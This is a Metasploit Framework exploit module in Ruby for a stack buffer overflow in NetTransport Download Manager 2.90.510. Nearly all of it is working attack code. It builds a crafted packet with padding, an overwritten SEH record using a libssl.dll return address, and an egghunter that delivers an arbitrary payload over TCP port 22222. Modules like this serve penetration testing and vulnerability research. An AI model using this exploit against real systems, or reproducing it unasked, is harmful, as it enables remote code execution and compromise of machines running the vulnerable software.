##
# $Id: nettransport.rb 10150 2010-08-25 20:55:37Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Egghunter
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'NetTransport Download Manager 2.90.510 Buffer Overflow',
			'Description'    => %q{
					This exploits a stack buffer overflow in NetTransport Download Manager,
				part of the NetXfer suite. This module was tested
				successfully against version 2.90.510.
			},
			'Author' 	 =>
				[
					'Lincoln',
					'dookie',
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10150 $',
			'References'     =>
				[
					[ 'OSVDB', '61435' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/10911'],
				],
			'Privileged'     => false,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh'
				},
			'Payload'        =>
				{
					'Space'    => 5000,
					'BadChars' => "\x00\x20\x0a\x0d",
					'StackAdjustment' => -3500,
					'DisableNops'     =>  'True'
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows Universal', { 'Ret' => 0x10002a57 } ], # p/p/r libssl.dll
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Jan 02 2010'))

		register_options(
			[
				Opt::RPORT(22222)
			], self.class)
	end

	def exploit
		connect

		magic_packet = "\xe3\x3d\x00\x00\x00\x01\xee\x4f\x08\xe3\x00\x0e\xae\x41\xb0\x24"
		magic_packet << "\x89\x38\x1c\xc7\x6f\x6e\x00\x00\x00\x00\xaf\x8d\x04\x00\x00\x00"
		magic_packet << "\x02\x01\x00\x01\x04\x00\x74\x65\x73\x74\x03\x01\x00\x11\x3c\x00"

		# Unleash the Egghunter!
		eh_stub, eh_egg = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true })

		sploit = magic_packet
		sploit << rand_text_alpha_upper(119)
		sploit << generate_seh_record(target.ret)
		sploit << make_nops(10)
		sploit << eh_stub
		sploit << make_nops(50)
		sploit << eh_egg

		print_status("Trying target #{target.name}...")
		sock.put(sploit)

		handler
		disconnect
	end

end
